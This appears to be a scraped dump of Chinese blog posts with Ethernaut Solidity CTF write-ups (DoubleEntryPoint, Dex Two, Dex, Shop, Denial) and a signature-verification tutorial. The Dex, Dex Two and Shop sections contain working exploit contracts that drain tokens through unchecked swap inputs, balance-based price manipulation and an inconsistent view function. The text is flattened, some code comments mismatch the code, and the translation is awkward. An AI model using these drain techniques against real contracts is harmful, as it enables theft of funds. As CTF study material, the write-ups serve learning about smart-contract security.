forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125;&#125; 合约是ERC20继承自 和 的DelegateERC20普通代币Ownable。DelegateERC20是强制合约实现tokenfunction delegateTransfer(address to, uint256 value, address origSender)需要的功能的接口LegacyToken。 有时constructor，设置一些状态变量并将100令牌铸造到CryptoVault. 在进入delegateTransfer函数之前，让我们回顾一下fortaNotify函数修饰符 123456789101112131415modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);&#125; 这个修改器的作用是触发 Forta 检测系统实现的一些逻辑。它在本地存储执行代码函数之前引发的警报数量，并将该数字与执行调用函数修饰符的函数主体之后引发的警报数量进行比较。 如果警报数量增加，交易将恢复并显示消息&quot;Alert has been triggered, reverting&quot;。 让我们回顾一下调用LegacyToken“遗留”时令牌也使用的重要功能。LegacyToken.transfer 12345678function delegateTransfer( address to, uint256 value, address origSender) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true;&#125; 如果查看函数修饰符列表，您会看到 onlyDelegateFrom只允许delegateFrom调用此函数。在这种情况下，只LegacyToken允许合约调用此函数，否则将允许任何人调用_transfer（即低级 ERC20 传输）来自origSender fortaNotify是一个特殊的功能修饰符，可以触发一些特定的 Forta 逻辑，就像我们之前看到的那样 函数本身很简单，就是调用函数的ERC20内部实现_transfer。请记住，_transfer只检查 thatto和origSenderare notaddress(0)以及origSender有足够的令牌可以转移到to（它还检查不足&#x2F;溢出条件）但它不检查 that origSenderismsg.sender或消费者是否有足够的津贴。这就是为什么我们有修饰符onlyDelegateFrom。 CryptoVault.sol12345678910111213141516171819202122contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) public &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125;&#125; 合约应实现普通加密 Vault 系统的逻辑。对于挑战的范围而言，这部分逻辑并不有趣。 由于任何金库也CryptoVault有一个基础令牌，在这种情况下是DoubleEntryPoint. 任何人都可以调用的函数sweepToken允许金库将任意token（指定为输入参数）的整个金库余额转移到sweptTokensRecipient. 收件人应该是安全的，因为它是由合同的部署者及时初始化的constructor。 从代码中可以看出，唯一完成的检查是防止 Vault 转移令牌underlying。 通过部署 Forta DetectionBot 找到漏洞并阻止它通过结合我们收集到的所有信息，您是否发现了我们可以利用的漏洞？回顾一下我们现有的知识： CryptoVault的underlying令牌是DoubleEntryPoint。该合约提供了一个sweepToken在 Vault 中转移代币的方法，但它阻止了清除DoubleEntryPoint代币（因为它是underlying） DoubleEntryPointtoken 是一个 ERC20 令牌，它实现了一个delegateTransfer只能由LegacyToken令牌调用的自定义函数，并且由 Forta 通过执行函数修饰符来监控fortaNotify。该函数允许委托人将一定数量的代币从origSpender任意接收者转移 LegacyToken是已“弃用”的 ERC20 令牌。当transfer(address to, uint256 value)函数被调用时DoubleEntryPoint，（令牌的“新版本”）delegate.delegateTransfer(to, value, msg.sender)被调用 问题在哪里？因为LegacyToken.transfer是“镜像”，DoubleEntryPoint.transfer这意味着当您要求尝试转移 1 个时，LegacyToken实际上您转移的是 1 个DoubleEntryPoint代币（为了能够做到这一点，您的余额中必须同时拥有这两个代币） 包含CryptoVault两个令牌中的 100 个，但sweepToken仅阻止underlying DoubleEntryPoint. 但是通过了解其工作原理，我们可以通过调用LegacyToken轻松扫除所有令牌。DoubleEntryPoint``CryptoVault.sweep(address(legacyTokenContract)) 现在我们知道如何利用它，我们如何利用 Forta 集成来防止利用并恢复交易？我们可以构建一个扩展 Forta 的合约IDetectionBot并将其插入DoubleEntryPoint. 通过这样做，我们应该能够在 VaultsweepToken触发LegacyToken.transfer将触发DoubleEntryPoint.delegateTransfer将触发（在执行函数代码之前）函数fortaNotify修饰符时防止利用。是的，我知道执行链很深，但请耐心等待，我们明白了！ 合约IDetectionBot接口只有一个函数签名function handleTransaction(address user, bytes calldata msgData) external;，可以通过DoubleEntryPoint.delegateTransfer这些参数直接调用forta.notify(player, msg.data)。 只有在这两个条件都为真时，我们才会在内部DetectionBot发出警报： 原始发件人（正在呼叫的人DoubleEntryPoint.delegateTransfer）是CryptoVault 调用函数的签名（的前 4 个字节calldata）等于delegateTransfer签名 让我们origSender从中提取值msgData（请记住，在本例中，该参数值等于msg.data）。如果您查看“特殊变量和函数”部分下的块和交易属性msg.data的 Solidity 文档，您会看到这是一种代表完整 calldata 的bytes calldata数据类型。这是什么意思？在这些字节中，您将同时拥有函数选择器（4 个字节）和函数有效负载。 要提取参数，我们可以简单地使用abi.decode这样的(address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address));。一个重要的注意事项：我们假设在这些字节中，这些特定类型的三个值以这些特定顺序排列。我们正在做一个非常艰难的假设。这就是为什么我们需要将此信息与函数签名与强制执行这些类型和顺序要求的函数签名相匹配这一事实结合起来delegateTransfer。 1msgData`第二部分非常简单，我们只需通过合并前 4 个字节来重建调用签名，`bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]);`并将其与我们知道的正确签名进行比较`delegateTransfer`→`abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) 解决方案代码让我们看看检测的整个代码DetectionBot 12345678910111213141516171819contract DetectionBot is IDetectionBot &#123; address private monitoredSource; bytes private monitoredSig; constructor(address _monitoredSource, bytes memory _monitoredSig) public &#123; monitoredSource = _monitoredSource; monitoredSig = _monitoredSig; &#125; function handleTransaction(address user, bytes calldata msgData) external override &#123; (address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address)); bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]); if (origSender == monitoredSource &amp;&amp; keccak256(callSig) == keccak256(monitoredSig)) &#123; IForta(msg.sender).raiseAlert(user); &#125; &#125;&#125; 在构造函数内部，第一个参数将是我们要监视的源，在本例中是地址，CryptoVault第二个参数是我们打算监视的函数的签名，在本例中是abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;)。 现在我们只需要部署传递正确参数的机器人并将机器人插入 Forta 系统并解决挑战。我们走吧！ 12345678910111213141516function exploitLevel() internal override &#123; vm.startPrank(player, player); // Create and deploy the `DetectionBot` with the correct constructor paramter // The first one is the source we want to monitor // The second one is the signature of the function we want to match DetectionBot bot = new DetectionBot( level.cryptoVault(), abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) ); // add the bot to the Forta network detection system that monitor the `DoubleEntryPoint` contract level.forta().setDetectionBot(address(bot)); vm.stopPrank();&#125; 3. 解题","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Dex Two","slug":"CTFS/ethernaut/Dex Two","date":"2023-03-11T04:15:10.000Z","updated":"2023-03-11T04:15:10.000Z","comments":true,"path":"2023/03/11/CTFS/ethernaut/Dex Two/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/11/CTFS/ethernaut/Dex%20Two/","excerpt":"","text":"Dex Two1. 题目要求 1.1 This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way. You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level. You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token. Things that might help: 题目代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;contract DexTwo is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function add_liquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableTokenTwo(token1).approve(msg.sender, spender, amount); SwappableTokenTwo(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125;&#125;contract SwappableTokenTwo is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125;&#125; 2. 分析tips：参考博客 2.1 分析合约： swap 函数 ： 1234567891011function swap( address from, address to, uint256 amount) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount);&#125; 当前swap函数不检查from，实际上是合约处理的to白名单token1和代币。token2``DexTwo 这是该函数先前版本中存在的检查：require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); 这是什么意思？这允许攻击者调用该swap函数，出售任意 令牌以从 Dexfrom获取“真实”令牌。to这意味着我们可以创建一个UselessERC20完全由我们拥有和管理的全新代币（我们可以铸造、销毁、做任何我们想做的事）并获得一些token1或token2免费获得。 我们可以耗尽DexTwo合同token1并token2各打一次电话吗？为此，我们需要找到正确的fakeToken卖出数量以取回 100 token1。 做数学计算，看一下getSwapAmount函数 100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken 100 token1 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken 123456 - 我们有两个可以控制的变量。我们肯定知道它`DexBalanceOfFakeToken`必须**&gt; 1**否则交易将因为被**0 除**而恢复。如果我们发送 1`FakeToken`给`DexTwo`我们 - &gt; ```unknown100 token1 = amountOfFakeTokenToSell * 100 / 11 token1 = amountOfFakeTokenToSell 因此，通过1 FakeToken1向DexTwo合约发送给它一些流动性，我们可以交换 100FakeToken以取回 100 token1。之后，我们只需要对另一个实例重复相同的操作，并从 Dex 中FakeToken2排出所有的。token2 攻击合约 1234567891011121314151617181920212223242526272829function exploitLevel() internal override &#123; vm.startPrank(player, player); // Deploy a fake token based on the SwappableTokenTwo contract // Mint 10k tokens and send them to the player (msg.sender) SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); // Approve the dex to manage all of our token token1.approve(address(level), 2**256 - 1); token2.approve(address(level), 2**256 - 1); fakeToken1.approve(address(level), 2**256 - 1); fakeToken2.approve(address(level), 2**256 - 1); // send 1 fake token to the DexTwo to have at least 1 of liquidity ERC20(fakeToken1).transfer(address(level), 1); ERC20(fakeToken2).transfer(address(level), 1); // Swap 100 fakeToken1 to get 100 token1 level.swap(address(fakeToken1), address(token1), 1); // Swap 100 fakeToken2 to get 100 token2 level.swap(address(fakeToken2), address(token2), 1); // Assert that we have drained the Dex contract assertEq(token1.balanceOf(address(level)) == 0 &amp;&amp; token2.balanceOf(address(level)) == 0, true); vm.stopPrank();&#125; 3. 解题","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Dex","slug":"CTFS/ethernaut/Dex","date":"2023-03-10T02:17:10.000Z","updated":"2023-03-10T02:17:10.000Z","comments":true,"path":"2023/03/10/CTFS/ethernaut/Dex/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/10/CTFS/ethernaut/Dex/","excerpt":"","text":"Dex1. 题目要求 1.1 此题目的目标是让您破解下面的基本合约并通过价格操纵窃取资金。 一开始您可以得到10个token1和token2。合约以每个代币100个开始。 如果您设法从合约中取出两个代币中的至少一个，并让合约得到一个的“坏”的token价格，您将在此级别上取得成功。 注意： 通常，当您使用ERC20代币进行交换时，您必须approve合约才能为您使用代币。为了与题目的语法保持一致，我们刚刚向合约本身添加了approve方法。因此，请随意使用 contract.approve(contract.address, ) 而不是直接调用代币，它会自动批准将两个代币花费所需的金额。 请忽略SwappableToken合约。 可能有帮助的注意点： 代币的价格是如何计算的？ approve方法如何工作？ 您如何批准ERC20 的交易？ 1.2 题目代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;contract Dex is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function addLiquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125;&#125;contract SwappableToken is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125;&#125; 2. 分析tips： 参考博客 2.1 分析代码可知：这是一个简单的ERC20令牌，它向铸造一个initialSupply（指定为 的输入）并覆盖了函数以防止地址能够批准任何令牌。 2.2 分析 Dex.sol 合约可知，它允许ownerDex 提供一对代币的流动性token1，并且token2在最终用户交换这些代币时不收取任何费用。最终用户将使用 Dex 来swap（出售）特定数量的一种代币，以取回swapAmount（取决于 Dex 的代币价格）另一种代币。 function setTokens(address _token1, address _token2) public onlyOwner1234function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2;&#125; 该功能允许Dex平台的所有者设置token1和的地址token2。该函数正确检查只有ownerDex 的 才能调用此函数。owner当已经提供这些代币的供应时，防止更改这些地址也是有意义的（否则旧代币将永远卡在合约中）。 function approve(address spender, uint256 amount) public1234function approve(address spender, uint256 amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount);&#125; 这是一个更实用的功能，允许最终用户批准spender管理amount两个令牌中的一个。这里没有什么奇怪的。您可以通过直接调用传递相同参数的token1和函数来实现相同的结果，正如我所说的，它只是一个实用函数，可以让最终用户的生活更轻松。token2 approve function balanceOf(address token, address account) public view returns (uint256)123function balanceOf(address token, address account) public view returns (uint256) &#123; return IERC20(token).balanceOf(account);&#125; 获取特定代币地址的用户余额的简单实用函数。 function swap(address from, address to, uint256 amount) public123456789101112function swap( address from, address to, uint256 amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount);&#125; 这是负责将一个代币与另一个代币交换（出售&#x2F;购买）的功能。您看到的第一个require，检查您是否只能交换token1，token2反之亦然。 之后，Dex 计算掉期价格。对于给定amount的一个令牌，用户取回了多少其他令牌？ 然后它执行所有需要的传输 amount将出售的代币从用户转移到 Dex 合约 批准Dex管理swapAmount用户购买的代币 swapAmount从 Dex 向用户转移金额 当且仅当两者token1都是代币标准token2的良好实施时，才不需要对这些金额进行检查ERC20。当前的 Dex 正在使用 OpenZeppelin ERC20 实现的两种代币，因此如果 Dex 或用户的余额中没有足够数量的代币来执行转账，交易将自动恢复 function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256)这是整个合约中最核心也是最重要的功能。此功能负责计算掉期价格。执行 的tokenX交换操作时，用户获得多少令牌？tokenY Dex 内部的当前实现是使用代币余额来计算价格，并因此计算用户将收到的代币数量。 为什么这是个问题？使用余额作为计算价格的一个因素将使您的合约热衷于称为“价格操纵”的攻击，不幸的是（但不仅与这个简单的余额案例有关）它并不少见。 用于计算用户因交换操作而收到的代币数量的公式如下((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))) 这个公式告诉你当你发送代币to时你会得到多少代币。较低的是（与 的余额相比）的余额，较高的是 的金额。amount``from``from``to``to 该 Dex 不使用外部Oracle（如Chainlink）或Uniswap TWAP（时间加权平均价格）来计算掉期价格。相反，它使用令牌的余额来计算它，我们可以利用它。 在 Solidity 中，有一个称为“舍入误差”的已知问题。这个问题是由所有整数除法向下舍入到最接近的整数这一事实引起的。这意味着如果你执行5/2结果将不是2.5but 2。 举个例子，如果我们卖掉 1，token1但token2*amount &lt; token1我们会拿回0 token2！基本上我们会出售代币以获得零回报！ 2.3 参考视频 编写攻击合约 1234567891011121314151617181920212223242526272829303132333435contract Hack &#123; IDex private immutable dex; IERC20 private immutable token1; IERC20 private immutable token2; constructor (IDex _dex) &#123; dex = _dex; token1 = IERC20(dex.token1); token2 = IERC20(dex.token2); &#125; function pwn() external &#123; token1.transferFrom(msg.sender, address(this), 10); token2.transferFrom(msg.sender, address(this), 10); token1.approve(address(dex), type(uint).max); token2.approve(address(dex), type(uint).max); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); dex.swap(address(token2), address(token1), 45); require(token1.balanceOf(address(dex)) == 0, &quot;dex.balance != 0&quot;); &#125; function _swap(IERC20 tokenIn, IERC20 tokenOut) private &#123; dex.swap( address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this))) &#125;&#125; 3. 解题（资金不足）","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Shop","slug":"CTFS/ethernaut/Shop","date":"2023-03-08T04:47:10.000Z","updated":"2023-03-08T04:47:10.000Z","comments":true,"path":"2023/03/08/CTFS/ethernaut/Shop/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/08/CTFS/ethernaut/Shop/","excerpt":"","text":"Shop1. 题目要求 1.1 您能在商店以低于要求的价格购买到商品吗？ 可能有帮助的注意点： shop合约预计由买家使用 了解view函数的限制 1.2 题目代码： 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Buyer &#123; function price() external view returns (uint);&#125;contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price(); &#125; &#125;&#125; 2. 分析tips：参考博客 2.1 观察代码可知 ，我们有一个price内部合同，代表购买该物品必须支付wei的金额。Buyer 也可以仅在尚未售出的情况下购买该商品。该属性由函数中isSold初始化为false然后更改为的状态变量处理。 2.2 详细查看 buy() 函数， 这是合约的主要功能。它投射到msg.sender并Buyer通过这样做它期望交易的发送者是一个实现接口中定义的功能的合约。&#96;&#96; 即使在挑战描述中没有明确说明，也应该返回买家愿意为购买商店商品支付的function price() external view returns (uint256);价格。 合同检查买方的价格（买方愿意支付的价格）是否大于商店的价格，并检查该商品是否尚未售出。如果这个要求通过，它会更新isSold到true并将price的值更新为_buyer.price();理论上应该与之前一条指令返回的值相同。 2.3 这里的关键概念是：你永远不应该 盲目地相信你期望外部参与者会做什么，即使你定义了一个具有外部参与者应该信任的逻辑的特定接口。 永远不要盲目相信不在你控制之下的事情。 因为我们是买家，所以我们可以简单的实现price这样的功能 123function price() external view returns (uint256) &#123; return victim.isSold() ? 1 : 1000;&#125; 因为price是一个view函数，我们不能有一个内部状态变量来改变uint256函数返回的值，但我们可以进行标记为view或 的外部调用函数pure。 2.4 参考视频 写的攻击合约 1234567891011121314151617181920contract Hack &#123; Shop private immutable target; constructor (address _target) &#123; target = Shop(_target); &#125; function pwn() external &#123; target.buy(); require(target.price() == 99, &quot;price != 99&quot;); &#125; function price() external view returns (uint) &#123; if (target.isSold()) &#123; return 99; &#125; return 100; &#125;&#125; 3. 解题（暂时没有以太了，到时候有钱了再来做，生成实例就需要 0.3ether）","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"了解签名认证","slug":"Basic_Knowledge/solidity/了解签名认证","date":"2023-01-22T08:47:10.000Z","updated":"2023-01-22T08:47:10.000Z","comments":true,"path":"2023/01/22/Basic_Knowledge/solidity/了解签名认证/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/22/Basic_Knowledge/solidity/%E4%BA%86%E8%A7%A3%E7%AD%BE%E5%90%8D%E8%AE%A4%E8%AF%81/","excerpt":"","text":"验证签名1. 签名代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// SPDX-License-Identifier: MITpragma solidity ^0.8.4; /* 1. message to sign 2. hash(message) 3. sign(hash(message), private key) | offchain 4. ecrecover(hash(message), signature) == signer */contract VerifySig &#123; // verify 验证签名函数 function verify(address _signer, string memory _message, bytes memory _sig) external pure returns(bool) &#123; bytes32 messageHash = getMessageHash(_message); // 对输入的消息进行 hash运算 bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash); // 对输入消息进行二次hash return recover(ethSignedMessageHash, _sig) == _signer; // 判断公钥的地址是否与_signer 相等? &#125; function getMessageHash(string memory _message) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked(_message)); // 对消息进行hash运算 &#125; function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; //在消息中加入 &quot;\\x19Ethereum Signed Message:\\n32&quot; 字符串,将该字符串和 _messageHash 打包并进行hash运算 return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); &#125; function recover(bytes32 _ethSignedMessageHash, bytes memory _sig) public pure returns(address) &#123; (bytes32 r, bytes32 s, uint8 v) = _split(_sig); // 将_sig 分割为 r, s, v三个部分 return ecrecover(_ethSignedMessageHash, v, r, s); &#125; function _split(bytes memory _sig) internal pure returns(bytes32 r, bytes32 s, uint8 v) &#123; require(_sig.length == 65, &quot;invalud signature length&quot;); assembly &#123; // add(_sig, 32) 指跳过32位长度, 去获取_sig 中的一个32位数据 r := mload(add(_sig, 32)) // add(_sig, 64) 指跳过64位长度, 去获取_sig 中的一个32位数据 s := mload(add(_sig, 64)) // add(_sig, 96) 指跳过96位长度, 去获取_sig 中的一个32位数据 // byte(0, mload(add(_sig, 96))) 返回32位中的第一个值 v := byte(0, mload(add(_sig, 96))) &#125; &#125;&#125; 2. 心得参悟：2.1 ecrecover()函数，作用：在solidity中是，将签名的公钥返回。即，假如我使用我的🦊账户给消息进行签名，得到一个签名；在ecrecover() 函数中传入 以太坊签名消息（对消息进行二次 hash运算的结果） ，和签名的组成部分 r , s, v，最终返回的结果为 我🦊钱包的账户地址（公钥） 概括：ecrecover()函数通过传入的”以太坊签名消息” 和 “签名的（r s v）组成部分” 返回公钥（🦊钱包账户地址的前身）2.2 计算以太坊签名消息： 消息可以是能被执行的交易，也可以是其他任何形式。为了避免用户误签了恶意交易，EIP191提倡在消息前加上&quot;\\x19Ethereum Signed Message:\\n32&quot;字符，并再做一次keccak256哈希，作为以太坊签名消息。经过toEthSignedMessageHash()函数处理后的消息，不能被用于执行交易:12345function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); //在消息中加入 &quot;\\x19Ethereum Signed Message:\\n32&quot; 字符串,将该字符串和_messageHash 打包并进行hash运算 &#125; 3. 数字签名的相关知识链接","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ecrecover","slug":"ecrecover","permalink":"https://biyouqiuqiu.com/tags/ecrecover/"}]},{"title":"Denial","slug":"CTFS/ethernaut/Denial","date":"2023-01-19T07:10:10.000Z","updated":"2023-01-19T07:10:10.000Z","comments":true,"path":"2023/01/19/CTFS/ethernaut/Denial/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/CTFS/ethernaut/Denial/","excerpt":"","text":"Denial1. 题目要求 1.1 这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。 通关条件： 在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M） 1.2 题目要求 123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Denial &#123; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance / 100; // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call&#123;value:amountToSend&#125;(&quot;&quot;); payable(owner).transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = block.timestamp; withdrawPartnerBalances[partner] += amountToSend; &#125; // allow deposit of funds receive() external payable &#123;&#125; // convenience function function contractBalance() public view returns (uint) &#123; return address(this).balance; &#125;&#125; 2. 分析tips： 参考博客 2.1这个函数做了什么： 设置合约的余额amountToSend partner通过低级别将余额的 1% 转移到call 将余额的 1% 转入合约的ownerviatransfer withdraw更新函数最后一次执行的时间 更新合作伙伴提取的金额 正如我们所说，这个挑战完全是关于拒绝服务 (DOS) 的概念，这是一个通用术语，用于描述外部参与者拒绝服务的某个方面的情况。在这种特定情况下，我们要否认withdraw合约的过程。 我们该怎么做？call我们唯一的选择是在外部对地址做一些坏事partner。让我们看看底层call在 Solidity 中是如何工作的。 1(bool success, bytes memory data) = targetAddress.call&#123;value: &lt;weiSent&gt;, gas: &lt;gasForwarded&gt;&#125;(&lt;calldata&gt;); 